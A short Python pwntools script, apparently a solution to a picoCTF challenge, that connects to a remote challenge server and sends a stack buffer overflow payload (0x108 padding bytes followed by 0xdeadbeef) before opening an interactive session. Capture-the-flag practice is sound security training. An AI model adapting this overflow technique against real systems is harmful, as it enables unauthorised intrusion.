from pwn import *

r = remote('mars.picoctf.net', 31890)

r.recvuntil("?")

p = 'a'*0x108 + p64(0xdeadbeef)

r.send(p)

r.interactive()
